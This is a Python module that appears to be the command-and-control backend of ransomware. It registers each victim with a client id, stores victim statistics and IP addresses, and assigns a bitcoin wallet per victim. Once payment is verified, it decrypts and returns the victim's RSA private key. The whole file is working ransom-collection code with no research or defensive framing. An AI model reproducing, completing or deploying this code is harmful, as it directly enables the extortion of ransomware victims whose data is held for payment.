import logging
import requests
import ipaddress
import random
from asymmetric_encryption import RSA
from base64 import b64encode, b64decode
from payment import verify_payment, generate_bitcoin_address
from db import insert_statistics_to_database
from validation import validate_decryption_request, validate_initialisation_request


logger = logging.getLogger(__name__)


def decrypt_rsa_data(encrypted_key):
    """Decrypt data encrypted with RSA

    Args:
        encrypted_key (list): A list containing all the parts of the RSA key

    Returns:
        dict: A dict with decrypted key
    """
    logger.info("Decrypting RSA data")
    cipher = RSA()
    unencrypted_local_private_key = b"".join(
        [cipher.decrypt_data(key_part) for key_part in encrypted_key]
    )
    payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
    logger.info(f"Returning Payload: {payload}")
    return payload


def unpack_decrypt_request(request_parameters):
    """Converts decrypt request parameter dict to individual variables

    Args:
        request_parameters (dict): A dictionary with all the request parameters

    Returns:
        tuple: A set with all the parametrs as individual elemnts which can be unpacked
    """
    logger.info("Unpacking decrypt request")
    client_id = request_parameters.get("client_id")
    private_key = [b64decode(part) for part in request_parameters.get("private_key")]
    assigned_wallet_address = b64decode(
        request_parameters.get("assigned_wallet_address")
    ).decode()
    payee_wallet_address = b64decode(
        request_parameters.get("payee_wallet_address")
    ).decode()
    return client_id, private_key, assigned_wallet_address, payee_wallet_address


def unpack_initialise_request(request_parameters):
    """Converts initialise request parameter dict to individual variables

    Args:
        request_parameters (dict): A dictionary with all the request parameters

    Returns:
        tuple: A set with all the parametrs as individual elemnts which can be unpacked
    """
    logger.info("Unpacking initialisation request")
    client_id = request_parameters.get("client_id")
    statistics = request_parameters.get("statistics")
    return client_id, statistics


def format_and_insert_statistics_to_database(client_id, statistics, request):
    """Format statistics data

    Args:
        client_id (str): Unique client id
        statistics (dict): Various info about client
        request (flask.request): The incoming request object 
    """
    statistics["client_id"] = client_id
    if request.headers.getlist("X-Forwarded-For"):
        ip = ipaddress.ip_address(request.headers.getlist("X-Forwarded-For")[0])
    else:
        ip = ipaddress.ip_address(request.remote_addr)

    statistics["ip_address"] = str(ip)
    insert_statistics_to_database(statistics)


def process_request(request, request_type):
    """Acts as a driver function to process requests

    Args:
        request (dict): The request object
        request_type (str): A string indicating the type of message

    Returns:
        dict: The response with various parameters included
    """
    
    parameters = request.get_json()
    if request_type == "initialise" and validate_initialisation_request(parameters):
        client_id, statistics = unpack_initialise_request(parameters)
        wallet_id = generate_bitcoin_address(client_id)
        format_and_insert_statistics_to_database(client_id, statistics, request)
        return {"client_id": client_id, "wallet_id": wallet_id}

    elif request_type == "decrypt" and validate_decryption_request(parameters):
        client_id, private_key, assigned_wallet_address, payee_wallet_address = unpack_decrypt_request(parameters)
        if verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
            return decrypt_rsa_data(private_key)

